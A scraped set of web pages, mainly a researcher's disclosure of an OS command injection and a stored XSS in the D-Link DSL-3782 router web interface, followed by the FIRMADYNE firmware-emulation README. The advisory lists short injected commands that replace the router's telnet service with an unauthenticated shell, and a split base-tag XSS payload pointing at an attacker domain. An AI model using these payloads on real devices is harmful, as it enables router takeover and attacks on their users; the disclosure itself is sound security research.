* [Vulnerabilities statistics](https://blog.mindedsecurity.com/search/label/Vulnerabilities%20statistics)
  (
  1
  )
* [WAF](https://blog.mindedsecurity.com/search/label/WAF)
  (
  1
  )
* [WAPT](https://blog.mindedsecurity.com/search/label/WAPT)
  (
  1
  )
* [Web Application Firewall](https://blog.mindedsecurity.com/search/label/Web%20Application%20Firewall)
  (
  1
  )
* [web architecture security](https://blog.mindedsecurity.com/search/label/web%20architecture%20security)
  (
  1
  )
* [Web Attacks](https://blog.mindedsecurity.com/search/label/Web%20Attacks)
  (
  23
  )
* [web cache](https://blog.mindedsecurity.com/search/label/web%20cache)
  (
  1
  )
* [web injection](https://blog.mindedsecurity.com/search/label/web%20injection)
  (
  4
  )
* [Web Security](https://blog.mindedsecurity.com/search/label/Web%20Security)
  (
  23
  )
* [Windows Phone Security](https://blog.mindedsecurity.com/search/label/Windows%20Phone%20Security)
  (
  1
  )
* [WWeb Security](https://blog.mindedsecurity.com/search/label/WWeb%20Security)
  (
  2
  )
* [zeus p2p](https://blog.mindedsecurity.com/search/label/zeus%20p2p)
  (
  3
  )

## Blog Archive

* [May](https://blog.mindedsecurity.com/2024/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2024/04/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2024/03/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2023/10/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2023/06/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2023/03/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2023/02/)
  (
  1
  )
* [July](https://blog.mindedsecurity.com/2022/07/)
  (
  1
  )
* [December](https://blog.mindedsecurity.com/2021/12/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2021/08/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2021/05/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2021/02/)
  (
  1
  )
* [January](https://blog.mindedsecurity.com/2021/01/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2020/11/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2020/10/)
  (
  1
  )
* [July](https://blog.mindedsecurity.com/2020/07/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2020/06/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2020/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2020/04/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2020/03/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2020/02/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2019/04/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2018/10/)
  (
  3
  )
* [September](https://blog.mindedsecurity.com/2018/09/)
  (
  3
  )
* [July](https://blog.mindedsecurity.com/2018/07/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2018/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2018/04/)
  (
  2
  )
* [November](https://blog.mindedsecurity.com/2017/11/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2017/06/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2016/02/)
  (
  2
  )
* [January](https://blog.mindedsecurity.com/2016/01/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2015/11/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2015/10/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2015/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2015/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2015/06/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2015/04/)
  (
  2
  )
* [March](https://blog.mindedsecurity.com/2015/03/)
  (
  4
  )
* [February](https://blog.mindedsecurity.com/2015/02/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2014/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2014/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2014/06/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2013/10/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2013/04/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2013/02/)
  (
  2
  )
* [November](https://blog.mindedsecurity.com/2012/11/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2012/10/)
  (
  3
  )
* [September](https://blog.mindedsecurity.com/2012/09/)
  (
  4
  )
* [June](https://blog.mindedsecurity.com/2012/06/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2011/10/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2011/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2011/08/)
  (
  2
  )
* [July](https://blog.mindedsecurity.com/2011/07/)
  (
  2
  )
* [May](https://blog.mindedsecurity.com/2011/05/)
  (
  2
  )
* [April](https://blog.mindedsecurity.com/2011/04/)
  (
  2
  )
* [March](https://blog.mindedsecurity.com/2011/03/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2010/10/)
  (
  8
  )
* [September](https://blog.mindedsecurity.com/2010/09/)
  (
  3
  )
* [August](https://blog.mindedsecurity.com/2010/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2010/06/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2010/04/)
  (
  4
  )
* [March](https://blog.mindedsecurity.com/2010/03/)
  (
  1
  )
* [December](https://blog.mindedsecurity.com/2009/12/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2009/11/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2009/10/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2009/05/)
  (
  4
  )
* [February](https://blog.mindedsecurity.com/2009/02/)
  (
  2
  )
* [January](https://blog.mindedsecurity.com/2009/01/)
  (
  1
  )

####

Minded Security was established in Italy in 2007

##### Services

* Training
* Testing
* Consulting
* Request a brochure

##### Information

* The Company
* blueclosure
* AMT – Banking Malware Detector
* Contact us
* Privacy Policy

##### Newsletter

©2015 Minded Security S.r.l. The Software Security Company - VAT IT05756380480

[Back to top](#top)



=== Content from c0mix.github.io_aac78547_20250125_232500.html ===


[![My Profile Photo](/images/profile.jpg)
# Lorenzo Comi](/)

---

IT Security Consultant

---

* [Blog](/#blog)

* [Disclosure](/Disclosure/)

* [About](/About)

---

* [Twitter](http://twitter.com/Th3Ch3mist)
* [LinkedIn](https://www.linkedin.com/in/lorenzo-comi-53b94789)
* [GitHub](https://www.github.com/c0mix)
* Email
* [RSS](/feed.xml "Subscribe")

24 Jan 2019
• on [Router](/tags/#Router) [IoT](/tags/#IoT) [WebPenTest](/tags/#WebPenTest) [CVE-2018–17990](/tags/#CVE-2018–17990) [CVE-2018-17989](/tags/#CVE-2018-17989)
# D-Link DSL-3782 SecAdvisory: OS Command Injection and Stored XSS

*In this article I’m going to release the technical details of two vulnerabilities that I found by analyzing D-Link DIR-3782 router web interface. In particular I’ve found OS Command Injection and Stored Cross Site Scripting vulnerabilities.*

## The Device: D-Link DSL-3782

The VDSL/ADSL Wi-Fi Modem Router AC1200 Dual-Band DSL-3782 is a router device suitable for homes or small offices with ADSL line.
Once powered on, the device provides a simple web interface with many different menu and settings, such as Firewall, Application, Port Forwarding and Access Control List. If you want more information about this product, a full description (in Italian) can be found [here](https://eu.dlink.com/it/it/products/dsl-3782-wireless-ac1200-dual-band-vdsl-adsl-modem-router)

At the time of writing, this device is marked as `in production` by D-Link and this means that its software is actively maintained and supported by the vendor. The firmware version afflicted by these vulnerabilities is the `1.01` and the `1.03` version addressed the flaws.

## OS Command Injection

OS command injection (also known as shell injection) is a web security vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, and it usually fully compromises the application and all its data.

### Discovery

Hunting for some injection points, I noticed a particular menu inside the router web server that allows a user to define a custom Access Control List (ACL).

![ACL Menu](/images/2019-01-24-D-Link-DIR-3782-SecAdvisory:-OS-Command-Injection-and-Stored-XSS/new_ACL.png)

I was curious to understand how it had been implemented so I decided to access the router console and search for some sort of “acl-related” file. Poking around inside the configuration directory `etc`, I found a script called `acl.sh` that seems to be promising.

![acl.sh](/images/2019-01-24-D-Link-DIR-3782-SecAdvisory:-OS-Command-Injection-and-Stored-XSS/new_ACLsh.png)

The next move was to determinate if this file was, in some way, related or linked to the ACL menu of the web interface. Below is provided a usage example of this functionality through some screenshots that show what a user can see from the web interface and also what happens inside the device configuration file `/etc/acl.sh` when a new ACL is activated.

![ACL Menu2](/images/2019-01-24-D-Link-DIR-3782-SecAdvisory:-OS-Command-Injection-and-Stored-XSS/new_ACLsh2.png)

![acl.sh2](/images/2019-01-24-D-Link-DIR-3782-SecAdvisory:-OS-Command-Injection-and-Stored-XSS/new_ACL2.png)

Great!! Now we know for sure that multiple user inputs such as `Source IP Address` or `Application`, that are sent as the form values `ScrIPaddrBeginTXT` and `ApplicationSEL`, are taken by the application and used as parameters for many different iptables commands so a change in web interface implies a direct change inside `acl.sh` script. Moreover the script is immediately executed by the device when a new ACL is created.

Let’s start to check if a correct validation is applied to user’s input. A variety of shell metacharacters can be used to perform OS command injection attacks, but the most common in a unix-like environment is the `;`. Indeed the first payload that I tried to inject inside `ScrIPaddrEndTXT` parameter was the harmless `;test` that aims to end the previous iptables command syntax with a `;` and execute the fake command `test`.

![acl.sh3](/images/2019-01-24-D-Link-DIR-3782-SecAdvisory:-OS-Command-Injection-and-Stored-XSS/new_request1.png)

Checking the `acl.sh` script it is possible to see my untouched payload, this is the prove that I can break the script syntax and execute arbitrary commands!!

![acl.sh3](/images/2019-01-24-D-Link-DIR-3782-SecAdvisory:-OS-Command-Injection-and-Stored-XSS/new_ACLsh3.png)

### Exploitation

It’s time to exploit this injection to take full control over the device! My idea was to put a backdoor on the device and then use it to access the whole system. I thought Telnet was a good option since the router already has this software on board and it would have provided a fast and reliable access to the filesystem.

Since the router by default runs a `utelnetd` service `358 admin 180 S utelnetd -l /bin/login -d` where a user, in order to access the system, has to provide valid credentials, it is necessary to stop this service and start a new one without any authentication. Something like this: `utelnetd -l /bin/sh -d`

However there was one big limitation with this injection point: the payload length. Suddenly the application cuts the user input allowing to inject only 15 characters (13 if you consider that the first and the last characters must be a semicolon `;`) so it is necessary to find a workaround to bypass this limitation.

After many failed attempts, I came out with the solution to my problem that could be defined a multi-stage exploit. In particular I’ve noticed that it was possible to inject commands multiple times inside the acl.sh script and all of them were executed, so the problem was to find a correct 13-chars-length command sequence that would have allowed to stop and then restart telnet service. I think there are different ways to do this, mine is the following:

```
Payload 1: 'ps|grep tel>a'     # identify telnet pid grepping ps output and store it in file a
Payload 2: 'grep -v gr a>b'    # remove unwanted line
Payload 3: 'kill $(cat b)'     # kill utelnetd
Payload 4: 'cp /bin/sh .'      # copy sh executable in root folder
Payload 5: 'utelnetd -dl sh'   # restart utelnetd binded on sh

```

The final exploit is a simple python script that, for each payload, obtains a new `sessionKey` (needed in order to perform any POST request to the router web application) and crafts the correct request based on exploit sequence. You can find it in my [github repo](https://github.com/c0mix/D-Link-DSL-3782-SecAdvisory).

### Final notes

In order to exploit this vulnerability an attacker needs to be logged inside the web application. However, in a real world scenario, it is possible to chain [CVE-2018-8898](https://www.exploit-db.com/exploits/44657) (authentication bypass vulnerability discovered by [Giulio Comi](https://www.linkedin.com/in/giuliocomi/)) to attempt to execute this exploit as an unauthenticated user. Please note that my exploit already takes advantage of this vulnerability as shown in the video.

## Stored Cross-Site Scripting

Cross-Site Scripting vulnerability, or XSS, arises when a malicious user input is echoed back inside a web application response without it has been properly sanitized. In particular, Stored Cross-Site Scripting occurs when data submitted by one user is stored in the application (typically in a back-end database) and then it is displayed to other users without being filtered or sanitized appropriately.

### Discovery

The first thing that I do when I’m looking for XSS is to try to inject simple HTML-related metacharacters like the `< >` and see how the application reacts. If the web application reflects or stores my payload and then includes it inside a response without any output encoding, it is a good indicator of an injection issue presence. The next step is to try a more complicated but harmless payload to achieve an html injection. For example, as you can see from the following screenshot, the html tag `<s>` was echoed back inside the response page and the html syntax results to be altered.

![acl.sh3](/images/2019-01-24-D-Link-DIR-3782-SecAdvisory:-OS-Command-Injection-and-Stored-XSS/new_xss3.png)

### Exploitation

It’s time to escalate this bug from an HTML to a JavaScript injection but, as aforementioned in the OS command injection, it is not possible to use a normal payload such as `<script>alert(1)</script>` because the application cuts our input.

We definitely have to find a really short xss payload but, thanks to [@brutelogic](https://twitter.com/brutelogic) who wrote a great blog post titled [The shortest xss payload](https://brutelogic.com.br/blog/shortest-reflected-xss-possible/), I’ve find out the `<base href=//att.com>` HTML tag that specifies the base URL/target for all relative URLs in a document. Basically, if an attacker managed to inject this tag inside a page, during the DOM construction all the external resources specified with a local path (such as `<img href="/image/cat.png">`) would be resolved with the new domain, so the browser instead of requesting a `current_domain/resource`, it will request a `new_base/resource`. Exploiting this behaviour the victim browser will automatically request some resources (the ones defined with a relative path) from the attacker’s domain.
If you want to explore in depth the functionality of the `base` tag, I’ve written a small demonstration page [here](https://www.w3schools.com/code/tryit.asp?filename=FZK6RNOO0OJX).

Let’s start to make it works! The first step to exploit this vulnerability is to find a short domain that fits the payload characters limitations. In particular,
in order to exploit this vulnerability in the wild, an attacker has to register a public domain composed by two short words with a dash between them: `<short string>-<short string>.<short top-level domain>`.
As example, I used the domain `a-tt.com` as the attacker’s domain and I managed to simulate its existence adding a line to my `hosts` configuration file.
The command showed below will force your pc to resolve the attacker’s domain `a-tt.com` with the 127.0.0.1 IP address.

```
127.0.0.1	a-tt.com

```

The second step needed is to create an `asp` file called `header.asp` with the real exploit payload, this code will be executed by the victim’s browser so you can add whatever you want. Reading the following steps the reason why the file needs to have this particular name and extension is clear. Since this is just a test, I created the following simple alert script that will prove the presence of the vulnerability by prompting a JavaScript popup.

```
<html>
    <h1>Attacker's Site</h1>
    <script>alert('XSS in domain: '+document.domain)</script>
</html>

```

The third step needed is to start a local web server (for example using python) in order to serve our resource.

```
$ sudo python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...

```

Now it is possible to test our configuration:

```
$ curl http://a-tt.com/header.asp
<html>
<h1>Attacker's Site</h1>
<script>alert('XSS in domain: '+document.domain)</script>
</html>

```

We are now ready to store the XSS payload inside the device web application tampering the following request.

![](/images/2019-01-24-D-Link-DIR-3782-SecAdvisory:-OS-Command-Injection-and-Stored-XSS/new_xss4.png)

As you can see from the image, the payload was divided in two parts that have been injected respectively: `<base href=//a` in the `SrcIPaddrBeginTXT` parameter and `tt.com>` in the `SrcIPaddrEndTXT` parameter.

Once the DOM tree will be created by the browser, the html code, with the injected payload, will be the following:

![](/images/2019-01-24-D-Link-DIR-3782-SecAdvisory:-OS-Command-Injection-and-Stored-XSS/new_xss2.png)

As effect of this modification in the `base`, the browser will request all the resources included in the page to the attacker’s domain `a-tt.com` instead of to the real domain and, in particular, the first request that will perform hits the resource `/header.asp` (that’s why we created this resource and hosted it on our server).
The final result is shown in the picture below, where our payload has been downloaded and executed by the victim’s browser!

![](/images/2019-01-24-D-Link-DIR-3782-SecAdvisory:-OS-Command-Injection-and-Stored-XSS/new_xss1.png)

## Conclusion

These vulnerabilities were submitted to the vendor that acknowledged their presence. Moreover, the following CVEs were assigned by Mitre:

* CVE-2018-17989 [Cross Site Scripting](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-17989)
* CVE-2018–17990 [OS Command Injection](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-17990)

## References

* [Pentesting iot](https://blog.mindedsecurity.com/2018/10/pentesting-iot-devices-part-2-dynamic.html)
* [Firmadyne Tool](https://github.com/firmadyne/firmadyne)

© 2021 Lorenzo Comi. All rights reserved.



=== Content from github.com_1dabd910_20250126_124715.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffirmadyne%2Ffirmadyne)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffirmadyne%2Ffirmadyne)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=firmadyne%2Ffirmadyne)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[firmadyne](/firmadyne)
/
**[firmadyne](/firmadyne/firmadyne)**
Public

* [Notifications](/login?return_to=%2Ffirmadyne%2Ffirmadyne) You must be signed in to change notification settings
* [Fork
  349](/login?return_to=%2Ffirmadyne%2Ffirmadyne)
* [Star
   1.9k](/login?return_to=%2Ffirmadyne%2Ffirmadyne)

Platform for emulation and dynamic analysis of Linux-based firmware

### License

[MIT license](/firmadyne/firmadyne/blob/master/LICENSE.txt)

[1.9k
stars](/firmadyne/firmadyne/stargazers) [349
forks](/firmadyne/firmadyne/forks) [Branches](/firmadyne/firmadyne/branches) [Tags](/firmadyne/firmadyne/tags) [Activity](/firmadyne/firmadyne/activity)
 [Star](/login?return_to=%2Ffirmadyne%2Ffirmadyne)

 [Notifications](/login?return_to=%2Ffirmadyne%2Ffirmadyne) You must be signed in to change notification settings

* [Code](/firmadyne/firmadyne)
* [Issues
  101](/firmadyne/firmadyne/issues)
* [Pull requests
  3](/firmadyne/firmadyne/pulls)
* [Actions](/firmadyne/firmadyne/actions)
* [Projects
  0](/firmadyne/firmadyne/projects)
* [Security](/firmadyne/firmadyne/security)
* [Insights](/firmadyne/firmadyne/pulse)

Additional navigation options

* [Code](/firmadyne/firmadyne)
* [Issues](/firmadyne/firmadyne/issues)
* [Pull requests](/firmadyne/firmadyne/pulls)
* [Actions](/firmadyne/firmadyne/actions)
* [Projects](/firmadyne/firmadyne/projects)
* [Security](/firmadyne/firmadyne/security)
* [Insights](/firmadyne/firmadyne/pulse)

# firmadyne/firmadyne

    master[Branches](/firmadyne/firmadyne/branches)[Tags](/firmadyne/firmadyne/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[97 Commits](/firmadyne/firmadyne/commits/master/) | | |
| [analyses](/firmadyne/firmadyne/tree/master/analyses "analyses") | | [analyses](/firmadyne/firmadyne/tree/master/analyses "analyses") |  |  |
| [binaries](/firmadyne/firmadyne/tree/master/binaries "binaries") | | [binaries](/firmadyne/firmadyne/tree/master/binaries "binaries") |  |  |
| [database](/firmadyne/firmadyne/tree/master/database "database") | | [database](/firmadyne/firmadyne/tree/master/database "database") |  |  |
| [images](/firmadyne/firmadyne/tree/master/images "images") | | [images](/firmadyne/firmadyne/tree/master/images "images") |  |  |
| [paper](/firmadyne/firmadyne/tree/master/paper "paper") | | [paper](/firmadyne/firmadyne/tree/master/paper "paper") |  |  |
| [scripts](/firmadyne/firmadyne/tree/master/scripts "scripts") | | [scripts](/firmadyne/firmadyne/tree/master/scripts "scripts") |  |  |
| [sources](/firmadyne/firmadyne/tree/master/sources "sources") | | [sources](/firmadyne/firmadyne/tree/master/sources "sources") |  |  |
| [.gitignore](/firmadyne/firmadyne/blob/master/.gitignore ".gitignore") | | [.gitignore](/firmadyne/firmadyne/blob/master/.gitignore ".gitignore") |  |  |
| [.gitmodules](/firmadyne/firmadyne/blob/master/.gitmodules ".gitmodules") | | [.gitmodules](/firmadyne/firmadyne/blob/master/.gitmodules ".gitmodules") |  |  |
| [Dockerfile](/firmadyne/firmadyne/blob/master/Dockerfile "Dockerfile") | | [Dockerfile](/firmadyne/firmadyne/blob/master/Dockerfile "Dockerfile") |  |  |
| [LICENSE.txt](/firmadyne/firmadyne/blob/master/LICENSE.txt "LICENSE.txt") | | [LICENSE.txt](/firmadyne/firmadyne/blob/master/LICENSE.txt "LICENSE.txt") |  |  |
| [README.md](/firmadyne/firmadyne/blob/master/README.md "README.md") | | [README.md](/firmadyne/firmadyne/blob/master/README.md "README.md") |  |  |
| [download.sh](/firmadyne/firmadyne/blob/master/download.sh "download.sh") | | [download.sh](/firmadyne/firmadyne/blob/master/download.sh "download.sh") |  |  |
| [example\_analysis.sh](/firmadyne/firmadyne/blob/master/example_analysis.sh "example_analysis.sh") | | [example\_analysis.sh](/firmadyne/firmadyne/blob/master/example_analysis.sh "example_analysis.sh") |  |  |
| [firmadyne.config](/firmadyne/firmadyne/blob/master/firmadyne.config "firmadyne.config") | | [firmadyne.config](/firmadyne/firmadyne/blob/master/firmadyne.config "firmadyne.config") |  |  |
| [setup.sh](/firmadyne/firmadyne/blob/master/setup.sh "setup.sh") | | [setup.sh](/firmadyne/firmadyne/blob/master/setup.sh "setup.sh") |  |  |
| [startup.sh](/firmadyne/firmadyne/blob/master/startup.sh "startup.sh") | | [startup.sh](/firmadyne/firmadyne/blob/master/startup.sh "startup.sh") |  |  |
| View all files | | |

## Repository files navigation

* README
* MIT license
# Table of Contents

* [Table of Contents](#table-of-contents)
* [Introduction](#introduction)
* [Setup](#setup)
  + [Extractor](#extractor)
  + [Database](#database)
  + [Binaries](#binaries)
  + [QEMU](#qemu)
* [Usage](#usage)
* [FAQ](#faq)
  + [run.sh is not generated](#runsh-is-not-generated)
  + [Log ends with "Kernel panic - not syncing: No working init found"](#log-ends-with-kernel-panic---not-syncing-no-working-init-found)
  + [A process crashed, e.g. do\_page\_fault() #2: sending SIGSEGV for invalid read access from 00000000](#a-process-crashed-eg-do_page_fault-2-sending-sigsegv-for-invalid-read-access-from-00000000)
  + [How do I debug the emulated firmware?](#how-do-i-debug-the-emulated-firmware)
* [Compiling from Source](#compiling-from-source)
  + [Toolchain](#toolchain)
  + [console](#console)
  + [libnvram](#libnvram)
  + [Kernel](#kernel)
    - [ARM](#arm)
    - [MIPS](#mips)
* [Database](#database-1)
  + [Data](#data)
  + [Schema](#schema)
* [Paper](#paper)

# Introduction

FIRMADYNE is an automated and scalable system for performing emulation and
dynamic analysis of Linux-based embedded firmware. It includes the following
components:

* modified kernels (MIPS: [v2.6](https://github.com/firmadyne/kernel-v2.6),
  ARM: [v4.1](https://github.com/firmadyne/kernel-v4.1),
  [v3.10](https://github.com/firmadyne/kernel-v3.10)) for instrumentation of
  firmware execution;
* a userspace [NVRAM library](https://github.com/firmadyne/libnvram) to emulate
  a hardware NVRAM peripheral;
* an [extractor](https://github.com/firmadyne/extractor) to extract a
  filesystem and kernel from downloaded firmware;
* a small [console](https://github.com/firmadyne/console) application to spawn
  an additional shell for debugging;
* and a [scraper](https://github.com/firmadyne/scraper) to download firmware from
  42+ different vendors.

We have also written the following three basic automated analyses
using the FIRMADYNE system.

* Accessible Webpages: This script iterates through each file
  within the filesystem of a firmware image that appears to be served by a
  webserver, and aggregates the results based on whether they appear to required
  authentication.
* SNMP Information: This script dumps the contents of the
  `public` and `private` SNMP v2c communities to disk using no credentials.
* Vulnerability Check: This script tests for the presence
  of 60 known vulnerabilities using exploits from Metasploit. In addition, it
  also checks for 14 previously-unknown vulnerabilities that we discovered.
  For more information, including affected products and CVE's, refer to
  [analyses/README.md](https://github.com/firmadyne/firmadyne/blob/master/analyses/README.md).

In our 2016 [Network and Distributed System Security Symposium (NDSS)](http://www.internetsociety.org/events/ndss-symposium)
paper, titled [Towards Automated Dynamic Analysis for Linux-based Embedded Firmware](https://github.com/firmadyne/firmadyne/blob/master/paper/paper.pdf), we evaluated the FIRMADYNE
system over a dataset of 23,035 firmware images, of which we were able to
extract 9,486. Using 60 exploits from the [Metasploit Framework](https://github.com/rapid7/metasploit-framework),
and 14 previously-unknown vulnerabilities that we discovered, we showed that
846 out of 1,971 (43%) firmware images were vulnerable to at least one exploit,
which we estimate to affect 89+ different products. For more details, refer to
our paper linked above.

**Note**: This project is a research tool, and is currently not production ready.
In particular, some components are quite immature and rough. We suggest
running the system within a virtual machine. No support is offered, but pull
requests are greatly appreciated, whether for documentation, tests, or code!

# Setup

First, clone this repository recursively and install its dependencies.

1. `sudo apt-get install busybox-static fakeroot git dmsetup kpartx netcat-openbsd nmap python-psycopg2 python3-psycopg2 snmp uml-utilities util-linux vlan`
2. `git clone --recursive https://github.com/firmadyne/firmadyne.git`

## Extractor

The extractor depends on the [binwalk](https://github.com/ReFirmLabs/binwalk)
tool, so we need to install that and its dependencies.

1. `git clone https://github.com/ReFirmLabs/binwalk.git`
2. `cd binwalk`
3. `sudo ./deps.sh`
4. `sudo python ./setup.py install`

* For Python 2.x, `sudo apt-get install python-lzma`

4. `sudo -H pip install git+https://github.com/ahupp/python-magic`
5. `sudo -H pip install git+https://github.com/sviehb/jefferson`.
6. Optionally, instead of [upstream sasquatch](https://github.com/devttys0/sasquatch),
   our [sasquatch fork](https://github.com/firmadyne/sasquatch) can be used to
   prevent false positives by making errors fatal.

## Database

Next, install, set up, and configure the database.

1. `sudo apt-get install postgresql`
2. `sudo -u postgres createuser -P firmadyne`, with password `firmadyne`
3. `sudo -u postgres createdb -O firmadyne firmware`
4. `sudo -u postgres psql -d firmware < ./firmadyne/database/schema`

## Binaries

To download our pre-built binaries for all components, run the following script:

* `cd ./firmadyne; ./download.sh`

Alternatively, refer to the instructions [below](#compiling-from-source) to compile from source.

## QEMU

To use [QEMU](http://wiki.qemu.org/Main_Page) provided by your distribution:

* `sudo apt-get install qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils`

Note that emulation of x86-based firmware is not currently supported, but installing
`qemu-system-x86` resolves a packaging issue on certain Debian-based distributions.

Alternatively, use our [modified version](https://github.com/firmadyne/qemu-linaro)
of [qemu-linaro](https://git.linaro.org/?p=qemu/qemu-linaro.git) for certain
firmware with an `alphafs` webserver that assumes a fixed memory mapping (not
recommended), or [upstream qemu](https://github.com/qemu/qemu).

# Usage

1. Set `FIRMWARE_DIR` in `firmadyne.config` to point to the root of this repository.
2. Download a firmware image, e.g. [v2.0.3](http://www.downloads.netgear.com/files/GDC/WNAP320/WNAP320%20Firmware%20Version%202.0.3.zip) for [Netgear WNAP320](https://www.netgear.com/support/product/WNAP320.aspx).
   * `wget http://www.downloads.netgear.com/files/GDC/WNAP320/WNAP320%20Firmware%20Version%202.0.3.zip`
3. Use the extractor to recover only the filesystem, no kernel (`-nk`), no parallel operation (`-np`), populating the `image` table in the SQL server at `127.0.0.1` (`-sql`) with the `Netgear` brand (`-b`), and storing the tarball in `images`.
   * `./sources/extractor/extractor.py -b Netgear -sql 127.0.0.1 -np -nk "WNAP320 Firmware Version 2.0.3.zip" images`
4. Identify the architecture of firmware `1` and store the result in the `image` table of the database.
   * `./scripts/getArch.sh ./images/1.tar.gz`
5. Load the contents of the filesystem for firmware `1` into the database, populating the `object` and `object_to_image` tables.
   * `./scripts/tar2db.py -i 1 -f ./images/1.tar.gz`
6. Create the QEMU disk image for firmware `1`.
   * `sudo ./scripts/makeImage.sh 1`
7. Infer the network configuration for firmware `1`. Kernel messages are logged to `./scratch/1/qemu.initial.serial.log`.
   * `./scripts/inferNetwork.sh 1`
8. Emulate firmware `1` with the inferred network configuration. This will modify the configuration of the host system by creating a TAP device and adding a route.
